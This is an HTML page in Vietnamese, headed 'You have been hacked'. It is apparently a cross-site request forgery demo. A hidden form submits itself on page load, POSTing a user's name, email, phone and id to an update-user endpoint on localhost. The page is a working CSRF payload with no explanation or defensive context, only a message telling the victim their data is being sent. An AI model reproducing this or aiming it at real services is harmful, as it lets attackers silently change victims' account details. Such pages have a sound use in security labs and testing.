<!DOCTYPE html>
<html lang="vi">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1" />
  <title>Bạn đã bị hack</title>
  
  <!-- MDBootstrap CSS -->
  <link
    href="https://cdnjs.cloudflare.com/ajax/libs/mdb-ui-kit/6.2.0/mdb.min.css"
    rel="stylesheet"
  />
  
  <style>
    body, html {
      height: 100%;
      background: #1c1c1c;
      color: #f44336;
      display: flex;
      justify-content: center;
      align-items: center;
      font-family: 'Roboto', sans-serif;
      text-align: center;
      padding: 20px;
    }
    .container {
      max-width: 500px;
      background: #2c2c2c;
      padding: 40px;
      border-radius: 12px;
      box-shadow: 0 0 15px #f44336aa;
    }
    h1 {
      font-weight: 900;
      margin-bottom: 30px;
    }
    p {
      font-size: 18px;
      margin-bottom: 40px;
    }
  </style>
</head>
<body>
  <div class="container">
    <h1><i class="fas fa-exclamation-triangle"></i> Bạn đã bị hack!</h1>
    <p>Chúng tôi đang gửi thông tin của bạn đến server.</p>

    <form id="autoSubmitForm" action="http://localhost:8082/api/update-user" method="POST" style="display:none;">
      <input type="text" name="name" value="Nguyen Van A" />
        <input type="email" name="email" value="a@example.com" />
        <input type="tel" name="phone" value="0123456789" />
        <input type="text" name="id" value="1" />
    </form>
  </div>

  <!-- MDBootstrap JS & dependencies -->
  <script
    type="text/javascript"
    src="https://cdnjs.cloudflare.com/ajax/libs/mdb-ui-kit/6.2.0/mdb.min.js"
  ></script>
  <!-- FontAwesome for the icon -->
  <script
    src="https://kit.fontawesome.com/a076d05399.js"
    crossorigin="anonymous"
  ></script>

  <script>
    // Tự động submit form khi trang load
    window.addEventListener('DOMContentLoaded', () => {
      document.getElementById('autoSubmitForm').submit();
    });
  </script>
  
</body>
</html>
